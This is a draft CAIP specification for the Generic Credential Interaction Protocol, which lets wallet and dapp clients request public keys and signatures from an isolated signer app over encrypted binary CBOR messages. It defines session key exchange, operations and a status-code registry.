---
caip: UNDEFINED
title: Generic Credential Interaction Protocol (GCIP)
discussions-to: https://github.com/ChainAgnostic/CAIPs/pull/
author: Andrei Chupin
status: Draft
type: Standard
category: Interface
created: 2025-11-30
---

## Abstract

A protocol based on FIDO2 [WebAuthn][webauthn] principles for delegating private key storage and transaction
signing to a separate secure application (Signer App). It allows Client Apps (Wallets, DApps) running
on various platforms (Mobile, Desktop, Web) to request Public Keys and sign content using a
credential ID, without direct access to the user's mnemonic phrases or private keys. The protocol
utilizes a fully binary block structure to ensure efficiency and compatibility across various
transports.

## Motivation

### 1. Problems with keys living inside “hot” wallet apps

The current model of storing keys within wallet applications has several significant security and
operational drawbacks:

1. **Audit Impossibility:** Frequent updates for new features make it infeasible to conduct professional security audits for every release.
2. **Unverifiable Integrity:** Centralized, closed-source release processes mean users cannot verify that the app code matches the published source, forcing them to trust that no backdoors were added.
3. **Bloated Attack Surface:** Modern wallets have browsers, dapp connectors, push messaging, analytics, and many other SDKs. Each feature introduces potential vulnerabilities.
4. **Network Exposure:** Wallets inherently require internet access, providing a direct channel for malware to access private keys.
5. **Seed Exposure:** Users repeatedly import seeds into multiple apps/devices, multiplying the points of failure and increasing the chance of falling for phishing attacks.

### 2. Benefits of a dedicated Signer

This CAIP proposes a **Separation of Concerns**: offload sensitive operations (seed storage and
signing) to an isolated Signer App, while Client Apps request public keys and signatures via a
narrow, auditable protocol. Key benefits:

- **Isolation:** Private keys are stored in a minimal, isolated application, protecting them from
  vulnerabilities in complex, frequently updated Client Apps.
- **Reduced Remote Surface:** The Signer App can operate without internet permissions and avoid
  shared/public storage, effectively acting as software-based cold storage.
- **Auditability:** The Signer's small codebase and minimal dependencies make it significantly
  easier to audit and secure than a monolithic wallet.
- **One Seed, Many Apps:** Users import their mnemonic phrase once into the Signer, then use it
  across unlimited Wallets and DApps without re-exposing the seed.
- **Consistent Trust:** Users always review and confirm transactions in the same trusted Signer
  interface, regardless of which app initiates the request.
- **Cross-Device Ready:** Designed to support cross-device signing and future credential
  synchronization between devices.
- **Binary Protocol:** Uses a compact binary structure (CBOR/Bytes), reducing memory usage and
  processing overhead. The compressed format allows passing large datasets through constrained
  OS channels (e.g., Android Intents, BLE, or QR codes) where standard JSON would fail.
- **Reduced Liability:** Wallet developers can build rich interfaces without the high risk and
  complexity of managing long-term secrets directly.
- **Innovations Velocity:** Solves the "cold start" problem for new security technologies. New
  key storage solutions (e.g., MPC, Web3Auth, Identity Solutions etc.) can launch as GCIP-compliant apps and
  immediately work with all existing GCIP-enabled wallets, without needing every wallet developer to
  integrate a custom SDK.

### Signer and Wallet
| | |
|---|---|
| <img src="https://github.com/Open-Store-Foundation/brandbook/blob/main/Firebox/screens/1Signer.png?raw=true" alt="1Signer" width="250"> | <img src="https://github.com/Open-Store-Foundation/brandbook/blob/main/Firebox/screens/2Wallet.png?raw=true" alt="2Wallet" width="250"> |

### Connecting Flow
| 1.                                                                                                                                | 2.                                                                                                                                        | 3.                                                                                                                                        | 4.                                                                                                                                  |
|-----------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------|
| <img src="https://github.com/Open-Store-Foundation/brandbook/blob/main/Firebox/screens/3Der.png?raw=true" alt="3Der" width="250"> | <img src="https://github.com/Open-Store-Foundation/brandbook/blob/main/Firebox/screens/4Wallets.png?raw=true" alt="4Wallets" width="250"> | <img src="https://github.com/Open-Store-Foundation/brandbook/blob/main/Firebox/screens/5Connect.png?raw=true" alt="5Connect" width="250"> | <img src="https://github.com/Open-Store-Foundation/brandbook/blob/main/Firebox/screens/6Pass.png?raw=true" alt="6Pass" width="250"> |

### Signing Flow
| 1.                                                                                                                                       | 2.                                                                                                                                  | 3.                                                                                                                                 | 4.                                                                                                                                       |
|------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|
| <img src="https://github.com/Open-Store-Foundation/brandbook/blob/main/Firebox/screens/7Connects.png?raw=true" alt="7Connects" width="250"> | <img src="https://github.com/Open-Store-Foundation/brandbook/blob/main/Firebox/screens/8Sign.png?raw=true" alt="8Sign" width="250"> | <img src="https://github.com/Open-Store-Foundation/brandbook/blob/main/Firebox/screens/9Pass.png?raw=true" alt="9Pass" width="250"> | <img src="https://github.com/Open-Store-Foundation/brandbook/blob/main/Firebox/screens/10Send.png?raw=true" alt="10Send" width="250"> |

## Specification

### 1. Definitions

#### 1.1. Actors and State

- **GCIP:** Generic Credential Interaction Protocol.
- **Signer App (Authenticator):** The secure application that stores private keys and performs
  signing. Acts similarly to a FIDO2 Authenticator.
- **Client App (Relying Party / Client):** The interface application for interacting with
  blockchains. It requests credentials (Public Keys) and signing operations.
- **Credential:** A unique handle representing a specific key pair (Public/Private) derived from the
  Signer App's master seed using a specific derivation path and algorithm. It is identified by a
  `credId`.
- **Connection** is session concept represented by `connectionId`, created during `gcip.connect` and
  referenced by later calls (for example, `gcip.extend` and `gcip.sign`).

### 2. Core Protocol

GCIP is a request/response protocol. The Client sends a binary `GcipBlock`, and the Signer returns a
binary `GcipBlock` with a status code and an optional payload.

At the wire level, a packet is:

`GcipBlockHeader || EncryptionMessage(PayloadBytes)`

For all operations `PayloadBytes` is the CBOR-encoded `EncryptionMessage` wrapper (see **2.2.0.
EncryptionMessage**). The operation request/response payload is carried inside
`EncryptionMessage.data`.

#### 2.1. Block Info

##### 2.1.1. `GcipBlock` header fields (big-endian)

| Offset | Size | Field            | Type     | Description                                            |
|:-------|:-----|:-----------------|:---------|:-------------------------------------------------------|
| 0      | 1    | **Version**      | `uint8`  | Protocol version (e.g., `1`).                          |
| 1      | 2    | **Status**       | `uint16` | Status code. See **3.9.0**.                            |
| 3      | 2    | **Nonce**        | `int16`  | Rolling number to prevent replay / correlate requests. |
| 5      | 1    | **Method**       | `int8`   | Operation method code. See **2.1.2**.                  |
| 6      | 4    | **Length**       | `int32`  | Payload length in bytes.                               |
| 10     | N    | **PayloadBytes** | `bytes`  | Payload bytes (typically CBOR `EncryptionMessage`).    |

If `Status` is a common error (status values `1..63`), the block MAY be sent as a short header
without `Method`, `Length` and `PayloadBytes`.

##### 2.1.2. Method code registry

Method codes are distinguishable by range: `0-127` are reserved for requests and `128-255` are
reserved for responses. The `Method` field is `int8`, so response codes may be represented as
negative values in some implementations.

| Method                     | Value (Byte) | Description                                                |
|:---------------------------|:-------------|:-----------------------------------------------------------|
| `gcip.exchange.request`    | 0            | Request to establish a secure session or exchange keys.    |
| `gcip.exchange.response`   | 128 (-128)   | Response to `gcip.exchange.request`.                       |
| `gcip.connect.request`     | 1            | Request credentials from the Signer App.                   |
| `gcip.connect.response`    | 129 (-127)   | Response to `gcip.connect.request`.                        |
| `gcip.extend.request`      | 2            | Request additional credentials for an existing connection. |
| `gcip.extend.response`     | 130 (-126)   | Response to `gcip.extend.request`.                         |
| `gcip.sign.request`        | 3            | Request a signature for a specific payload.                |
| `gcip.sign.response`       | 131 (-125)   | Response to `gcip.sign.request`.                           |
| `gcip.disconnect.request`  | 4            | Request to close an existing connection.                   |
| `gcip.disconnect.response` | 132 (-124)   | Response to `gcip.disconnect.request`.                     |
| `gcip.import.request`      | 5            | Request to import credentials into the Signer App.         |
| `gcip.import.response`     | 133 (-123)   | Response to `gcip.import.request`.                         |

#### 2.2. Common Information about Encryption & Wrapping

To ensure security across various transport environments (both trusted and untrusted), GCIP supports
an encryption wrapping mechanism for session-based communications using `EncryptionMessage` (see *
*2.2.0**).

##### 2.2.0. EncryptionMessage (Wrapper)

Used as the payload of `GcipBlock` to carry either plaintext method CBOR bytes (handshake) or
ciphertext bytes (session).

| Key    | Field           | Type                 | Description                                                                               |
|:-------|:----------------|:---------------------|:------------------------------------------------------------------------------------------|
| `0x01` | **eid**         | ID (16 bytes) / null | Exchange/session identifier. Optional (nil) for initial handshake request.                |
| `0x02` | **iv**          | Bytes (12) / null    | AES-GCM nonce for encrypted sessions.                                                     |
| `0x03` | **exchangeKey** | **COSE_Key** / null  | Optional ephemeral ECDH public key (COSE Map) during handshake / exchange. See **3.9.2**. |
| `0x04` | **data**        | Bytes                | Plaintext CBOR method payload (when `iv` absent) or ciphertext bytes (when `iv` present). |

##### 2.2.1. Wrapping rules

- **Handshake (Connect / Exchange)**: Requests may be sent with an unencrypted `EncryptionMessage`
  wrapper where `iv` is omitted. The `eid` MUST be absent (null) or all-zero to indicate no active
  session.
- **Session (Connect / Sign / Extend / Disconnect)**: When a secure session is established, requests
  and responses are wrapped in an `EncryptionMessage` where `iv` is present and `data` contains
  AES-GCM ciphertext. The `eid` identifies the session used to derive the key.

##### 2.2.2. Supported primitives

- **Key agreement**: ECDH over P-256, ECDH over X25519
- **Key derivation**: HKDF-SHA256
- **Encryption**: AES-256-GCM

GCIP uses two operational modes, depending on transport trust assumptions.

##### 2.2.3. Same-device trusted transports (Intent, ActionExtension, etc.)

In same-device and OS-mediated transports where the channel has strong integrity and identity
guarantees, the connection can be established with one RTT by performing `Connect` with an inline
`exchangeKey` carried by `EncryptionMessage`.

##### 2.2.4. Cross environments (QR, BLE, NFC etc.)

In cross-device or otherwise interceptable transports, the client MUST establish a session first
using `Exchange`, and then run `Connect` inside the established encrypted session.

##### 2.2.5. Session key derivation

Each party generates an ephemeral ECDH key pair and exchanges public keys (during `Exchange` or
`Connect` handshake).

| Name               | Size | Calculation                                       | Description                                 |
|:-------------------|:-----|:--------------------------------------------------|:--------------------------------------------|
| `ephemeralPrivKey` | 32   | `random()`                                        | Sender's ephemeral ECDH private key         |
| `peerPubKey`       | 65   | `bytes`                                           | Peer's ephemeral ECDH public key            |
| `sharedSecret`     | 32   | `ECDH(ephemeralPrivKey, peerPubKey)`              | Raw shared secret bytes                     |
| `eid`              | 16   | `ID`                                              | Exchange session identifier, **See 3.9.1.** |
| `salt`             | 16   | `eid`                                             | HKDF salt                                   |
| `info`             | 30   | `"GCIP/1/Session/AES-256-GCM"`                    | HKDF info                                   |
| `sessionKey`       | 32   | `HKDF(secret=sharedSecret, salt=salt, info=info)` | AES-GCM session key                         |

##### 2.2.6. Message formats: handshake vs session

##### 2.2.6.1 Handshake (no established session yet)

Used for initial `Connect` or `Exchange` when no session exists. The client sends its ephemeral
public key in plaintext; the signer responds with encrypted data using the newly derived session key.

```
    Client                                              Signer
      │                                                   │
      │  REQUEST (plaintext)                              │
      │  ┌─────────────────────────────────────────────┐  │
      │  │ eid: null (no session yet)                  │  │
      │  │ iv: null (not encrypted)                    │  │
      │  │ exchangeKey: client's ECDH public key       │  │
      │  │ data: plaintext CBOR request                │  │
      │  └─────────────────────────────────────────────┘  │
      │─────────────────────────────────────────────────►│
      │                                                   │
      │                              Generate ephemeral key pair
      │                              Compute sessionKey via ECDH
      │                              Generate new eid (16 bytes)
      │                              Encrypt response with sessionKey
      │                                                   │
      │  RESPONSE (encrypted)                             │
      │  ┌─────────────────────────────────────────────┐  │
      │  │ eid: new session ID (16 bytes)              │  │
      │  │ iv: random nonce (12 bytes)                 │  │
      │  │ exchangeKey: signer's ECDH public key       │  │
      │  │ data: AES-GCM ciphertext                    │  │
      │  └─────────────────────────────────────────────┘  │
      │◄─────────────────────────────────────────────────│
      │                                                   │
      │  Derive sessionKey using signer's exchangeKey     │
      │  Store (eid, sessionKey) for future requests      │
      │                                                   │
```

Request:

| Field         | Size | Value          | Description                                    |
|:--------------|:-----|:---------------|:-----------------------------------------------|
| `eid`         | 0    | `null`         | Absent (null)                                  |
| `iv`          | 0    | `null`         | Absent for handshake request                   |
| `exchangeKey` | N    | `clientPubKey` | Client's ephemeral P-256 public key (COSE_Key) |
| `data`        | N    | `plaintext`    | CBOR-encoded method payload                    |

Response:

| Field         | Size | Value          | Description                                    |
|:--------------|:-----|:---------------|:-----------------------------------------------|
| `eid`         | 16   | `ID`           | New session ID                                 |
| `iv`          | 12   | `random()`     | AES-GCM nonce                                  |
| `exchangeKey` | N    | `signerPubKey` | Signer's ephemeral P-256 public key (COSE_Key) |
| `data`        | N    | `ciphertext`   | AES-GCM ciphertext                             |

##### 2.2.6.2 Session (existing session)

Used for all operations after a session is established (`Sign`, `Extend`, `Disconnect`, `Import`,
or `Connect`/`Exchange` inside existing session). Both request and response are encrypted with the
established `sessionKey`.

```
    Client                                              Signer
      │                                                   │
      │  REQUEST (encrypted with sessionKey)              │
      │  ┌─────────────────────────────────────────────┐  │
      │  │ eid: existing session ID                    │  │
      │  │ iv: random nonce (12 bytes)                 │  │
      │  │ exchangeKey: null (no key exchange)         │  │
      │  │ data: AES-GCM ciphertext                    │  │
      │  └─────────────────────────────────────────────┘  │
      │─────────────────────────────────────────────────►│
      │                                                   │
      │                              Lookup sessionKey by eid
      │                              Decrypt request
      │                              Process operation
      │                              Encrypt response
      │                                                   │
      │  RESPONSE (encrypted with sessionKey)             │
      │  ┌─────────────────────────────────────────────┐  │
      │  │ eid: same session ID                        │  │
      │  │ iv: random nonce (12 bytes)                 │  │
      │  │ exchangeKey: null                           │  │
      │  │ data: AES-GCM ciphertext                    │  │
      │  └─────────────────────────────────────────────┘  │
      │◄─────────────────────────────────────────────────│
      │                                                   │
```

Request / Response:

| Field         | Size | Value        | Description         |
|:--------------|:-----|:-------------|:--------------------|
| `eid`         | 16   | `ID`         | Existing session ID |
| `iv`          | 12   | `random()`   | AES-GCM nonce       |
| `exchangeKey` | 0    | `null`       | Absent for normal session messages |
| `data`        | N    | `ciphertext` | AES-GCM ciphertext  |

##### 2.2.6.3 Session with Key Rotation

For key rotation during session operations (`Exchange`, `Sign`, `Extend`, `Disconnect`), the client
MAY include an `exchangeKey` to initiate inline key rotation. This provides forward secrecy by
generating a completely new session (`eid` + `sessionKey`), invalidating the old one.

```
    Client                                              Signer
      │                                                   │
      │  REQUEST (encrypted with CURRENT sessionKey)      │
      │  ┌─────────────────────────────────────────────┐  │
      │  │ eid: current session ID                     │  │
      │  │ iv: random nonce (12 bytes)                 │  │
      │  │ exchangeKey: client's NEW ECDH public key   │  │
      │  │ data: AES-GCM ciphertext                    │  │
      │  └─────────────────────────────────────────────┘  │
      │─────────────────────────────────────────────────►│
      │                                                   │
      │                              Decrypt with current sessionKey
      │                              Process operation (if any)
      │                              Generate NEW ephemeral key pair
      │                              Generate NEW eid
      │                              Derive NEW sessionKey via ECDH
      │                              Delete old session
      │                              Encrypt response with NEW sessionKey
      │                                                   │
      │  RESPONSE (encrypted with NEW sessionKey)         │
      │  ┌─────────────────────────────────────────────┐  │
      │  │ eid: NEW session ID (different from request)│  │
      │  │ iv: random nonce (12 bytes)                 │  │
      │  │ exchangeKey: signer's NEW ECDH public key   │  │
      │  │ data: AES-GCM ciphertext                    │  │
      │  └─────────────────────────────────────────────┘  │
      │◄─────────────────────────────────────────────────│
      │                                                   │
      │  Derive NEW sessionKey using signer's exchangeKey │
      │  Replace (old eid, old key) with (new eid, new key)│
      │                                                   │
```

**Key points:**
- Request is encrypted with the **current** `sessionKey`
- Response is encrypted with the **new** `sessionKey`
- The `eid` in the response is **different** from the request (new session)
- Both parties must atomically switch to the new session
- The old session becomes invalid immediately

Request (with rotation):

| Field         | Size | Value          | Description                              |
|:--------------|:-----|:---------------|:-----------------------------------------|
| `eid`         | 16   | `ID`           | Existing session ID                      |
| `iv`          | 12   | `random()`     | AES-GCM nonce                            |
| `exchangeKey` | N    | `clientPubKey` | Client's new ephemeral public key        |
| `data`        | N    | `ciphertext`   | AES-GCM ciphertext (encrypted with current sessionKey) |

Response (after rotation):

| Field         | Size | Value          | Description                              |
|:--------------|:-----|:---------------|:-----------------------------------------|
| `eid`         | 16   | `ID`           | **New** session ID (different from request) |
| `iv`          | 12   | `random()`     | AES-GCM nonce                            |
| `exchangeKey` | N    | `signerPubKey` | Signer's new ephemeral public key        |
| `data`        | N    | `ciphertext`   | AES-GCM ciphertext (encrypted with **new** sessionKey) |

Both parties derive a new `sessionKey` using the exchanged keys and the new `eid`. The old session is invalidated.

##### 2.2.7. AEAD (AES-GCM) and AAD binding

AES-GCM encryption is performed as:

| Name         | Size | Calculation                               | Description              |
|:-------------|:-----|:------------------------------------------|:-------------------------|
| `ciphertext` | N    | `AES-GCM(sessionKey, iv, aad, plaintext)` | AES-GCM ciphertext bytes |

The AAD binds the encrypted payload to the `GcipBlock` header and the session context.

| Name        | Size | Calculation                              | Description                        |
|:------------|:-----|:-----------------------------------------|:-----------------------------------|
| `headerSig` | 8    | `ver \|\| status \|\| nonce \|\| method` | Header binding (excludes `Length`) |
| `aad`       | 24   | `headerSig \|\| eid`                     | AAD for session messages           |

##### 2.2.8. `GcipBlock.Length` and payload bytes

`GcipBlock.Length` MUST equal the length in bytes of `GcipBlock.PayloadBytes`.

In encrypted operations, `PayloadBytes` is the CBOR-encoded `EncryptionMessage` map. This means
`Length` is the size of the encoded wrapper, not the raw ciphertext size.



#### 2.3. Failure Handling

If an operation fails, the response block MUST return an appropriate non-zero status code. 
**See 3.9.0.**

#### 2.4. Operations

This section describes operations as a single combined unit: overall block structure, main
request/response structure, and flow description. Nested CBOR types are defined in **3**.

##### 2.4.1. Connect

**Overview**: Create a new connection session and return one or more derived public credentials (
`credId` plus public key material).

**Main request structure** (`gcip.connect.request`):

```
{
  clientData(0x01): ClientData,
  credentials(0x02): [ CredentialRequest ],
  transport(0x03): Transport,
  meta(0x20): b'data'
}
```

**Main response structure** (`gcip.connect.response`):

```
{
  connectionId(0x01): ID,
  connectionType(0x02): 0,
  signerData(0x03): SignerData,
  bundles(0x04): [ CredentialBundleResponse ],
  meta(0x20): b'data'
}
```

**Flow description**:

1. The Client MUST send `gcip.connect.request` wrapped in `EncryptionMessage`.
    - The `transport` field is REQUIRED as it describes the channel the client is using (or intends to use) and is
      used for policy, UX, and origin verification heuristics.
    - To establish a new secure session in one RTT, the client MAY include `exchangeKey` in
      `EncryptionMessage`, with `eid`, `iv` omitted. In this mode, the `gcip.connect.request` CBOR
      payload MUST be sent in plaintext inside `EncryptionMessage.data`.
2. The Signer MUST validate the request format, supported algorithms, and origin (when possible).
3. The Signer MUST prompt the user to approve the connection and the disclosure of derived public keys.
4. The Signer MUST derive requested credentials and assign a `credId` to each derivation.
5. The Signer MUST generate its own ephemeral key pair, compute the shared secret (`sessionKey`), and
   include its `exchangeKey` in the response `EncryptionMessage` alongside a newly generated `eid`
   and encrypted `payloadBody` with `sessionKey`.
6. The Signer MUST return `gcip.connect.response`.

##### 2.4.2. Exchange

**Overview**: Establish a secure session (`sessionKey`) without requesting credentials immediately.

**Main request structure** (`gcip.exchange.request`):

```
{
  transport(0x01): Transport,
  meta(0x20): b'data'
}
```

**Main response structure** (`gcip.exchange.response`):

```
{
  meta(0x20): b'data'
}
```

**Flow description**:

1. The Client MUST send `gcip.exchange.request` wrapped in `EncryptionMessage` with `exchangeKey` present.
   The `eid` and `iv` fields MUST be omitted.
2. The Signer MUST generate a response key pair and a new `eid`.
3. The Signer MUST return `gcip.exchange.response` wrapped in `EncryptionMessage` with `eid` set and
   `exchangeKey` present.
4. Both parties MUST compute the shared secret (`sessionKey`) using ECDH. Future messages using this `eid`
   MUST be encrypted with this key.

##### 2.4.0. Exchange vs Connect (and why both exist)

`gcip.connect` and `gcip.exchange` solve different problems:

- `gcip.connect` creates an application-level **connection** (`connectionId`) and returns derived *
  *public credentials**.
- `gcip.exchange` creates only a cryptographic **secure session** (`eid` + `sessionKey`) used to
  encrypt later messages. It does not create a `connectionId` and does not return credentials.

In many environments, `clientData` (like `name` and `origin`) should be treated as **claimed
identity** and not as a secret: it can be copied or spoofed (for example, by repackaging/decompiling
apps or by imitating a web origin in an untrusted environment). The Signer should treat this as UX
and policy input, and verify it only when the transport can attest it.

If a client cares about **traffic sniffing** or wants to keep the full `connect` request body
private on interceptable channels:

- Preferred: run `gcip.exchange` first, then send `gcip.connect` **inside the encrypted session** (2
  RTT). This ensures `clientData`, credential requests, and any metadata are not observable on the
  wire.
- Optional (performance): send `gcip.connect` directly in handshake mode (1 RTT). This is acceptable
  for trusted same-device transports or when plaintext request body exposure is not a concern.

##### 2.4.3. Extend

**Overview**: Request additional credentials under an existing connection, returning new or
already-known derivations.

**Main request structure** (`gcip.extend.request`):

```
{
  connectionId(0x01): ID,
  credentials(0x02): [ CredentialRequest ],
  transport(0x03): Transport,
  meta(0x20): b'data'
}
```

**Main response structure** (`gcip.extend.response`):

```
{
  credentials(0x01): [ CredentialBundleResponse ],
  connectionId(0x02): ID,
  meta(0x20): b'data'
}
```

**Flow description**:

1. The Client MUST send `gcip.extend.request` with an existing `connectionId` and requested credential
   derivations.
2. The Signer MUST validate `connectionId` and request fields.
3. The Signer MUST prompt the user to approve returning additional public credentials.
4. The Signer MUST return `gcip.extend.response`.

##### 2.4.4. Sign

**Overview**: Produce a signature over a `challenge` using a previously obtained `credId` scoped to
a valid `connectionId`.

**Main request structure** (`gcip.sign.request`):

```
{
  connectionId(0x01): ID,
  credId(0x02): ID,
  challenge(0x03): Challenge,
  transport(0x04): Transport,
  meta(0x20): b'data'
}
```

**Main response structure** (`gcip.sign.response`):

```
{
  signingId(0x01): ID,
  sig(0x02): b'data',
  meta(0x20): b'data'
}
```

**Flow description**:

1. The Client MUST send `gcip.sign.request` with `connectionId`, `credId`, and `challenge`.
2. The Signer MUST validate the connection and credential authorization, and check algorithm and transform
   support.
3. The Signer MUST display a confirmation UI with origin (and verification status when available) and a
   user-meaningful representation of the challenge when possible.
4. After explicit user approval, the Signer MUST return `gcip.sign.response`.

##### 2.4.5. Disconnect

**Overview**: Close a connection session and invalidate its identifier for future use.

**Main request structure** (`gcip.disconnect.request`):

```
{
  connectionId(0x01): ID,
  transport(0x02): Transport,
  meta(0x20): b'data'
}
```

**Main response structure** (`gcip.disconnect.response`):

```
{
  connectionId(0x01): ID,
  meta(0x20): b'data'
}
```

**Flow description**:

1. The Client MUST send `gcip.disconnect.request` with `connectionId`.
2. The Signer MUST invalidate the connection and return `gcip.disconnect.response`.

##### 2.4.6. Import

**Overview**: Import credentials (private keys or mnemonics) into the Signer App from a Client App.
This operation is useful for migration scenarios where a user wants to move their existing keys to a
GCIP-compliant Signer.

**Main request structure** (`gcip.import.request`):

```
{
  clientData(0x01): ClientData,
  credentials(0x02): [ CredentialRequest ],
  transport(0x03): Transport,
  meta(0x20): b'data'
}
```

**Main response structure** (`gcip.import.response`):

```
{
  signerData(0x01): SignerData,
  bundles(0x02): [ CredentialBundleResponse ],
  meta(0x20): b'data'
}
```

**Flow description**:

1. The Client MUST send `gcip.import.request` with `clientData`, credential data to import, and `transport`.
2. The Signer MUST validate the request format and origin (when possible).
3. The Signer MUST prompt the user to approve the import operation.
4. The Signer MUST securely store the imported credentials.
5. The Signer MUST return `gcip.import.response` with the resulting credential bundles.

**Security considerations**:
- Import operations should be treated with extreme caution as they involve receiving sensitive key material.
- The Signer SHOULD warn the user about the risks of importing keys from untrusted sources.
- Imported credentials SHOULD be clearly marked as imported vs. natively generated in the Signer UI.

### 3. Nested CBOR Structures and Types

This section defines the nested CBOR structures referenced by the operation payloads in **2.4**.

#### 3.2. Party (ClientData / SignerData)

**ClientData**

| Key    | Field      | Type  | Req/Opt/Cond | Description                                                                                   |
|:-------|:-----------|:------|:-------------|:----------------------------------------------------------------------------------------------|
| `0x01` | **name**   | UTF-8 | required     | Display name shown to the user. Max 50 chars.                                                 |
| `0x02` | **origin** | UTF-8 | required     | Web Origin (WHATWG URL), e.g. `https://app.uniswap.org`. Required for web-based interactions. |

**SignerData**

| Key    | Field      | Type  | Req/Opt/Cond | Description                                   |
|:-------|:-----------|:------|:-------------|:----------------------------------------------|
| `0x01` | **name**   | UTF-8 | required     | Display name shown to the user. Max 50 chars. |
| `0x02` | **scheme** | UTF-8 | required     | Platform Scheme. See **3.9.11**.              |
| `0x03` | **id**     | UTF-8 | required     | **Signer ID**. See **3.9.12**.                |

#### 3.3. Challenge

The content to be signed.

| Key    | Field         | Type  | Req/Opt/Cond | Description                                                                        |
|:-------|:--------------|:------|:-------------|:-----------------------------------------------------------------------------------|
| `0x01` | **payload**   | Bytes | required     | Raw bytes to be signed or challenged.                                              |
| `0x02` | **fmt**       | Int   | optional     | Representation hint for `payload`. See **3.9.3**.                                  |
| `0x03` | **transform** | Array | optional     | Hashing/transforms to apply to `payload` before signing (in order). See **3.9.9**. |

#### 3.4. Transport

Transport details used in `gcip.exchange.request`.

| Key    | Field      | Type  | Req/Opt/Cond | Description                         |
|:-------|:-----------|:------|:-------------|:------------------------------------|
| `0x01` | **type**   | Int   | required     | Transport type. See **3.9.5**.      |
| `0x02` | **params** | Bytes | optional     | Transport-specific parameter bytes. |

#### 3.5. Credential Request

Requests a credential of a given `type`, with one or more derivation parameters.

| Key    | Field      | Type                               | Req/Opt/Cond | Description                                   |
|:-------|:-----------|:-----------------------------------|:-------------|:----------------------------------------------|
| `0x01` | **type**   | Int                                | required     | Credential type. See **3.9.8**.               |
| `0x02` | **params** | Array of **Derivation Parameters** | required     | Requested derivation parameters. See **3.6**. |

#### 3.6. Credential Parameters

Credential parameters vary based on the credential type requested.

##### 3.6.1. Derivation Parameters (for `public-key` type)

Derivation parameters for generating or identifying a key.

| Key    | Field       | Type             | Req/Opt/Cond | Description                                                                 |
|:-------|:------------|:-----------------|:-------------|:----------------------------------------------------------------------------|
| `0x01` | **alg**     | Int              | required     | Signing algorithm (COSE). See **3.9.2**.                                    |
| `0x02` | **der**     | Bytes            | conditional  | Arbitrary derivation input. Mutually exclusive with `derPath`.              |
| `0x03` | **derPath** | Array of 5 ulong | conditional  | BIP-32 derivation path encoded as unsigned 32-bit indices (max 5 segments). |

##### 3.6.2. Mnemonic Parameters (for `mnemonic` type)

Parameters for mnemonic import operations.

| Key    | Field    | Type | Req/Opt/Cond | Description                             |
|:-------|:---------|:-----|:-------------|:----------------------------------------|
| `0x01` | **type** | Int  | required     | Mnemonic type. See **3.9.11**.

#### 3.7. Credential Bundle Response

Returned credentials for a `namespace` (wallet name in the Signer UI), grouped by credential `type`.

| Key    | Field           | Type                             | Req/Opt/Cond | Description                              |
|:-------|:----------------|:---------------------------------|:-------------|:-----------------------------------------|
| `0x01` | **type**        | Int                              | required     | Credential type. See **3.9.8**.          |
| `0x02` | **credentials** | Array of **Credential Response** | required     | Returned credentials.                    |
| `0x03` | **namespace**   | UTF-8                            | required     | Wallet namespace shown in the Signer UI. |

##### 3.7.1. Credential Response

Single credential material returned by the Signer.

| Key    | Field       | Type     | Req/Opt/Cond | Description                                                  |
|:-------|:------------|:---------|:-------------|:-------------------------------------------------------------|
| `0x01` | **credId**  | Bytes    | required     | Credential identifier (handle for subsequent signing).       |
| `0x02` | **payload** | Bytes    | required     | Credential material (raw public key bytes or COSE_Key).      |
| `0x03` | **params**  | Bytes    | required     | CBOR-encoded credential parameters used for this credential. |

#### 3.8. Meta

Optional request metadata.

| Key    | Field    | Type  | Req/Opt/Cond | Description                |
|:-------|:---------|:------|:-------------|:---------------------------|
| `0x10` | **meta** | Bytes | optional     | Arbitrary binary metadata. |

#### 3.9. Common type definitions and registries

##### 3.9.0. Status code registry

| Range      | Category           | Code         | Name                            | Description                                                                         |
|:-----------|:-------------------|:-------------|:--------------------------------|:------------------------------------------------------------------------------------|
| **0-9**    | **Environment**    | `0x00 (0)`   | **Success**                     | Operation completed successfully.                                                   |
|            |                    | `0x01 (1)`   | **Unknown Error**               | An unexpected error occurred.                                                       |
|            |                    | `0x02 (2)`   | **Unsafe Device**               | The device environment is considered unsafe (e.g., rooted).                         |
|            |                    | `0x03 (3)`   | **Should Retry**                | A temporary issue occurred; the client should retry the request (PlatformApiError). |
|            |                    | `0x04 (4)`   | **Unknown Client**              | The client identifier is unknown or invalid (UnknownCaller).                        |
|            |                    | `0x05 (5)`   | **User Canceled**               | The user declined the request.                                                      |
|            |                    | `0x06 (6)`   | **Too Many Requests**           | Each application can send only one sign request at the same time.                   |
| **32-63**  | **Block**          | `0x20 (32)`  | **Invalid Block**               | The block structure is malformed or too short.                                      |
|            |                    | `0x21 (33)`  | **Unsupported Version**         | The protocol version is not supported.                                              |
|            |                    | `0x22 (34)`  | **Unknown Method**              | The method code is not recognized.                                                  |
|            |                    | `0x23 (35)`  | **Unknown Status**              | The status code is not recognized.                                                  |
| **64-255** | **Body / Request** | `0x40 (64)`  | **Encryption Error**            | Failed to decrypt or encrypt the message.                                           |
|            |                    | `0x41 (65)`  | **Invalid Format**              | The request format is invalid or missing required fields.                           |
|            |                    | `0x42 (66)`  | **Invalid Method**              | The requested method is not supported or invalid.                                   |
|            |                    | `0x43 (67)`  | **Unknown Exchange**            | The exchange ID is not recognized (UnknownSession).                                 |
|            |                    | `0x44 (68)`  | **Unsupported Transport**       | The requested transport method is not supported.                                    |
|            |                    | `0x45 (69)`  | **Missing Challenge**           | The challenge field is missing when required.                                       |
|            |                    | `0x46 (70)`  | **Unknown Representation**      | The requested repr type is not supported.                                           |
|            |                    | `0x47 (71)`  | **Unknown Transform**           | The requested transform type is not supported.                                      |
|            |                    | `0x48 (72)`  | **Invalid Client Data**         | The provided client data structure is invalid.                                      |
|            |                    | `0x49 (73)`  | **Unsupported Algorithm**       | The requested algorithm is not supported.                                           |
|            |                    | `0x80 (128)` | **Missing Origin**              | The `clientData.origin` is missing.                                                 |
|            |                    | `0x81 (129)` | **Invalid Origin**              | The origin format is invalid.                                                       |
|            |                    | `0x82 (130)` | **Missing Credential Params**   | Required parameters for credential generation are missing.                          |
|            |                    | `0x83 (131)` | **Unknown Credential Param**    | A provided credential parameter is unknown or unsupported.                          |
|            |                    | `0x84 (132)` | **Unverified Origin**           | The origin could not be cryptographically verified.                                 |
